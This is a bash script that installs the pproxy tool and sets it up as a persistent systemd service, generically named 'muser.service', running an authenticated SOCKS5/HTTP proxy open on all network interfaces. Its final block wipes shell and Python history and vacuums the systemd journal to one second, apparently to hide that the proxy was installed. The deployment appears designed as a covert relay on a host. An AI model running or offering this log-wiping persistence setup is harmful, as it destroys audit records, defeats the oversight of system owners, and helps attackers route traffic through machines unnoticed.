#!/bin/bash
set -euo pipefail

if [[ $EUID -eq 0 ]]; then
    echo "Running as root."
    IS_ROOT=true
else
    echo "Running as non-root user."
    IS_ROOT=false
fi

if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <PORT> <USERNAME> <PASSWORD>"
    exit 1
fi

PORT="$1"
USERNAME="$2"
PASSWORD="$3"

if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
    echo "PORT must be a number." >&2
    exit 1
fi

if (( PORT < 1024 || PORT > 65535 )); then
    echo "PORT must be between 1024 and 65535." >&2
    exit 1
fi

if [ "$IS_ROOT" = true ]; then
    if command -v pip3 >/dev/null 2>&1; then
        echo "pip3 is installed at: $(command -v pip3)"
    else
        echo "pip3 not found. Please install pip3 system-wide." >&2
        exit 1
    fi

    if command -v pproxy >/dev/null 2>&1; then
        PPROXY_PATH=$(command -v pproxy)
        echo "pproxy is installed at: $PPROXY_PATH"
    else
        echo "Installing/upgrading system-wide pproxy..."
        if ! pip3 install --upgrade pproxy; then
            echo "Failed to install/upgrade pproxy." >&2
            exit 1
        fi
        if command -v pproxy >/dev/null 2>&1; then
            PPROXY_PATH=$(command -v pproxy)
            echo "pproxy is installed at: $PPROXY_PATH"
        else
            echo "pproxy installation failed; executable not found." >&2
            exit 1
        fi
    fi
else
    if command -v pip3 >/dev/null 2>&1; then
        echo "pip3 is installed at: $(command -v pip3)"
    else
        echo "pip3 not found. Installing pip3..."
        mkdir -p "$HOME/.local/bin"
        if ! wget -q https://bootstrap.pypa.io/get-pip.py -O "$HOME/get-pip.py"; then
            echo "Failed to download get-pip.py." >&2
            exit 1
        fi
        python3 "$HOME/get-pip.py" --user
        rm -f "$HOME/get-pip.py"
    fi

    export PATH="$HOME/.local/bin:$PATH"

    if command -v pproxy >/dev/null 2>&1; then
        PPROXY_PATH=$(command -v pproxy)
        echo "pproxy is installed at: $PPROXY_PATH"
    else
        echo "Installing/upgrading pproxy..."
        if ! pip3 install --user --upgrade pproxy; then
            echo "Failed to install/upgrade pproxy." >&2
            exit 1
        fi
        if command -v pproxy >/dev/null 2>&1; then
            PPROXY_PATH=$(command -v pproxy)
            echo "pproxy is installed at: $PPROXY_PATH"
        else
            if [ -f "$HOME/.local/bin/pproxy" ]; then
                PPROXY_PATH="$HOME/.local/bin/pproxy"
            elif [ -f "/usr/local/bin/pproxy" ]; then
                PPROXY_PATH="/usr/local/bin/pproxy"
            else
                echo "pproxy installation failed; executable not found." >&2
                exit 1
            fi
            echo "pproxy is installed at: $PPROXY_PATH"
        fi
    fi
fi

if ! command -v systemctl >/dev/null 2>&1; then
    echo "systemctl not found. This script requires systemd support." >&2
    exit 1
fi

if [ "$IS_ROOT" = true ]; then
    SERVICE_FILE="/etc/systemd/system/muser.service"
else
    SERVICE_FILE="$HOME/.config/systemd/user/muser.service"
fi

echo "Creating/updating service file: $SERVICE_FILE"
if [ "$IS_ROOT" = false ]; then
    mkdir -p "$HOME/.config/systemd/user"
fi

cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=PPROXY Proxy Service
After=network.target

[Service]
ExecStart=$PPROXY_PATH -l "socks5+http://0.0.0.0:$PORT#$USERNAME:$PASSWORD"
Restart=always
Environment=PYTHONUNBUFFERED=1

[Install]
WantedBy=default.target
EOF

if [ "$IS_ROOT" = true ]; then
    echo "Reloading systemd daemon..."
    if ! systemctl daemon-reload; then
        echo "Failed to reload systemd configuration." >&2
        exit 1
    fi

    echo "Enabling muser.service..."
    if ! systemctl enable muser.service; then
        echo "Failed to enable muser.service." >&2
        exit 1
    fi

    if systemctl is-active --quiet muser.service; then
        echo "Restarting muser.service..."
        if ! systemctl restart muser.service; then
            echo "Failed to restart muser.service." >&2
            exit 1
        fi
    else
        echo "Starting muser.service..."
        if ! systemctl start muser.service; then
            echo "Failed to start muser.service." >&2
            exit 1
        fi
    fi

    if systemctl is-active --quiet muser.service; then
        echo "muser.service is running successfully."
    else
        echo "muser.service failed to run." >&2
        exit 1
    fi
else
    echo "Reloading user systemd configuration..."
    if ! systemctl --user daemon-reload; then
        echo "Failed to reload systemd configuration." >&2
        exit 1
    fi

    echo "Enabling user muser.service..."
    if ! systemctl --user enable muser.service; then
        echo "Failed to enable muser.service." >&2
        exit 1
    fi

    if systemctl --user is-active --quiet muser.service; then
        echo "Restarting muser.service..."
        if ! systemctl --user restart muser.service; then
            echo "Failed to restart muser.service." >&2
            exit 1
        fi
    else
        echo "Starting muser.service..."
        if ! systemctl --user start muser.service; then
            echo "Failed to start muser.service." >&2
            exit 1
        fi
    fi

    if systemctl --user is-active --quiet muser.service; then
        echo "muser.service is running successfully."
    else
        echo "muser.service failed to run." >&2
        exit 1
    fi
fi

echo "Clearing logs and history for security..."
rm -f ~/.bash_history ~/.python_history ~/.wget-hsts || true
history -c 2>/dev/null || true
if [ "$IS_ROOT" = true ]; then
    journalctl --rotate >/dev/null 2>&1 || true
    journalctl --vacuum-time=1s >/dev/null 2>&1 || true
else
    journalctl --user --rotate >/dev/null 2>&1 || true
    journalctl --user --vacuum-time=1s >/dev/null 2>&1 || true
fi

echo "pproxy is running on port $PORT with authentication $USERNAME:$PASSWORD."
